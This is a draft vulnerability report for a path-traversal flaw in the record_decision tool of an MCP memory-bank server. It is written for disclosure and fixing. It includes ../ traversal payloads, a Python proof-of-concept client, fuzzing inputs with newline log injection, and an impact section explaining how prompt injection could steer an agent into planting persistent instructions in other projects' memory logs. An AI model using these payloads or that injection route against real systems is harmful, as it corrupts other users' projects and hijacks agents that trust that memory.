# Path traversal in `record_decision`: `projectPath` appends to `decisionLog.md` in any directory

**Repository:** `dazeb/cline-mcp-memory-bank` · **Tool:** `record_decision` · **Tested commit:** `55c81b9`
**Weakness:** CWE-22 Path Traversal

## Summary
`record_decision` appends a decision entry to `<projectPath>/memory-bank/decisionLog.md`. `projectPath` is used exactly as given, with no check that it is the configured project (`PROJECT_PATH`) or any other allowed root. Absolute paths and `..` segments both work. A tool call can therefore add caller-written Markdown to the decision log of any project on disk that has a memory bank. Agents later load that log as trusted context.

## Details
`src/index.ts:706-719` (tested commit):

```ts
private async handleRecordDecision(args: any) {
  const { projectPath, decision } = args;
  if (!projectPath || !decision) {
    throw new McpError(ErrorCode.InvalidParams, 'Project path and decision are required');
  }
  try {
    const filePath = path.join(projectPath, this.memoryBankPath, 'decisionLog.md');
    const currentContent = await fs.readFile(filePath, 'utf8');
    const updatedContent = this.addDecision(currentContent, decision);
    await fs.writeFile(filePath, updatedContent, 'utf8');
```

The file name is fixed, so the reach is limited to existing `memory-bank/decisionLog.md` files. `addDecision` (lines 861-888) inserts `title`, `description`, `rationale`, `impact`, `alternatives` and `relatedDecisions` verbatim. The server already has a project root in `process.env.PROJECT_PATH` (used by the resource handlers, line 303), but the tool handlers ignore it.

## Steps to reproduce
1. Prerequisites: Node.js 18+ and pnpm.
2. Install and build as the README describes: `git clone https://github.com/dazeb/cline-mcp-memory-bank && cd cline-mcp-memory-bank && pnpm install && pnpm run build`.
3. Create a stand-in "other project" outside the working directory:

   ```sh
   mkdir -p /tmp/tofu-poc-project/memory-bank
   printf '# Decision Log\n\n## Technical Decisions\n\n## Pending Decisions\n' > /tmp/tofu-poc-project/memory-bank/decisionLog.md
   ```

   Then call the tool with:

   ```json
   {"projectPath": "../../../../../../../../tmp/tofu-poc-project",
    "decision": {"title": "tofu-poc", "description": "tofu-poc", "rationale": "tofu-poc", "status": "accepted"}}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="node", args=["build/index.js"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("record_decision", {
                   "projectPath": "../../../../../../../../tmp/tofu-poc-project",
                   "decision": {"title": "tofu-poc", "description": "tofu-poc",
                                "rationale": "tofu-poc", "status": "accepted"}})
               print(result)

   asyncio.run(main())
   ```
4. Observe the reply `Decision recorded successfully`, and a new `### tofu-poc (...)` section in `/tmp/tofu-poc-project/memory-bank/decisionLog.md`.

## Expected behavior
`projectPath` must resolve inside the configured project root, or the call is rejected.

## Actual behavior
Any path whose `memory-bank/decisionLog.md` exists is accepted. In the fuzzing run:

```
input:  {'projectPath': '..\\..\\..\\..\\windows\\win.ini', 'decision': {'title': 'Log Injection\nCRITICAL: root access granted', ..., 'status': 'proposed', ...}}
output: Decision recorded successfully
```

That input used Windows separators, which are literal characters on the Linux test host. It hit a directory of that name that an earlier `initialize_memory_bank` call had created inside the working directory. The `/`-separated form above leaves the working directory.

## Impact
The LLM picks `projectPath` and the decision text, and prompt injection can steer both. An attacker can plant instructions in another project's decision log, which Cline-style agents read back as project memory. That is a persistent prompt-injection foothold across projects. Writes are append-only and limited to existing files named `memory-bank/decisionLog.md`. Low to medium severity.

## Suggested fix
Resolve `projectPath` with `path.resolve` and `fs.realpath`. Reject it unless it equals `PROJECT_PATH` or starts with `PROJECT_PATH + path.sep`. Simpler still, ignore the argument and always use `PROJECT_PATH`. Apply the same helper to `update_context`, `track_progress` and `initialize_memory_bank`.

## Status on the default branch
Still present at `55c81b9` (2025-07-17). The tested commit is the current default branch head.

## Prior reports
- #5 "Path Traversal Vulnerability in dazeb/cline-mcp-memory-bank" (issue, open 2026-04-27): reports the same unchecked `projectPath` reaching `fs.readFile`/`fs.writeFile` in `handleInitializeMemoryBank`, `handleUpdateContext`, `handleRecordDecision` and `handleTrackProgress` at the same commit `55c81b9`. Still open, and the default branch has no commit after 2025-07-17, so it is unfixed; this draft duplicates it.
- Documentation: README.md: the tool examples pass `projectPath: '/path/to/project'`, so absolute paths are the documented usage. No allowed root or warning is documented.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported in #5 (open, unfixed at 55c81b9). File only as a comment on #5, or not at all.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` only.
- Campaigns and executions: corpus-sbx 2560 exec / 408 ok; repo24-b 246784 / 25999 and 327680 / 35218; e2-0922 1024 / 195.
- Evidence (verbatim, trimmed):
  - `{'projectPath': '..\\..\\..\\..\\windows\\win.ini', 'decision': {'title': 'Log Injection\nCRITICAL: root access granted', 'description': 'Testing log injection with newline', 'rationale': 'Check for log injection', 'status': 'proposed', 'impact': 'logs\nadmin=true', ...}}` -> `Decision recorded successfully`
  - two more variants with the same `projectPath` -> same output
- Hand-check hints: real but low. `projectPath` reaches `fs.readFile`/`fs.writeFile` unchecked. All logged inputs stayed inside cwd on Linux (backslash path), so the escape is from code reading. Repro not run. Best filed together with the other three memory-bank tools as one issue, led by `initialize_memory_bank`.
</details>
